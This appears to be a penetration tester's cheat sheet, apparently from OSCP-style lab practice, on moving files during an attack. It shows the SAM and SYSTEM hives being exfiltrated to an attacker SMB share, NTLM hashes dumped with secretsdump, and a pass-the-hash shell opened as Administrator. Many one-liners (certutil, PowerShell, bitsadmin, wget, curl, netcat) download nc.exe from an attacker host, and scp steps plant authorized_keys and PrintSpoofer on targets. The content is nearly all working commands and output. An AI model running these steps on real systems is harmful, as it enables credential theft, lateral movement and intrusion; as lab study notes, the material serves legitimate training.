
## SMB

On local machine:

```
impacket-smbserver test . -smb2support  -username kourosh -password kourosh
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

On target machine:

```
net use m: \\192.168.45.241\test /user:kourosh kourosh
```

Downloaded SAM file on local machine.

```
copy SAM m:\
```

Downloaded SYSTEM file on local machine.

```
copy SYSTEM m:\
```

Utilize secretsdump to dump hashes.

```
/usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -sam SAM local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xb4999e49259682622dcc1e3a1636ff45
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f518eb35353d7a83d27e7fe457664e5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:856f13362db36284f7d964120d794a98:::
enterpriseadmin:1001:aad3b435b51404eeaad3b435b51404ee:d94267c350fc02154f2aff04d384b354:::
diana:1002:aad3b435b51404eeaad3b435b51404ee:3f2e7dddbe7a42d8978c1689b67297f3:::
alex:1003:aad3b435b51404eeaad3b435b51404ee:821036ef8b6f43194779f6fca426f3f7:::
enterpriseuser:1004:aad3b435b51404eeaad3b435b51404ee:b875ee792421982ebcfa8217340ef376:::
offsec:1005:aad3b435b51404eeaad3b435b51404ee:d2ce08a1ee362158863d47d478b2622e:::
[*] Cleaning up...
```

Connected to Administrator with wmiexec.py

```
/usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f518eb35353d7a83d27e7fe457664e5 Administrator@192.168.238.222
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
clientwk222\administrator
```

---
## Windows

##### CMD

```
certutil -urlcache -split -f http://192.168.45.171/nc.exe nc.exe
```
##### PowerShell

```
iwr -uri http://192.168.45.171/nc.exe -o nc.exe
```

```
(New-Object System.Net.WebClient).DownloadFile('http://192.168.45.171/nc.exe', 'nc.exe')
```

```
Start-BitsTransfer -Source http://192.168.45.171/nc.exe -Destination nc.exe
```
##### BitsAdmin

```
bitsadmin /transfer job /download /priority high http://192.168.45.171/nc.exe C:\Users\Public\nc.exe
```

Authenticated

```
bitsadmin /transfer job /download /priority high /aclprededence http://192.168.45.171/nc.exe C:\Users\Public\nc.exe
```

---

## Linux

```
wget http://192.168.45.171/nc.exe .
```

```
curl http://192.168.45.171/nc.exe -o nc.exe
```

##### Netcat

On local machine

```
nc -lvnp 4444 < nc.exe
```

```
nc 192.168.45.171 4444 > nc.exe
```

##### SSH

##### Downloading 

```
scp lnorgaard@keeper.htb:/home/lnorgaard/passcodes.kdbx .
```
##### Uploading

```
scp PrintSpoofer64.exe david@target.ine.local:"C:\\Users\\david\\" --> e.G with ssh
```

```
scp -O /home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Sorcerer/home/max/.ssh/authorized_keys max@192.168.130.100:/home/max/.ssh/authorized_keys
```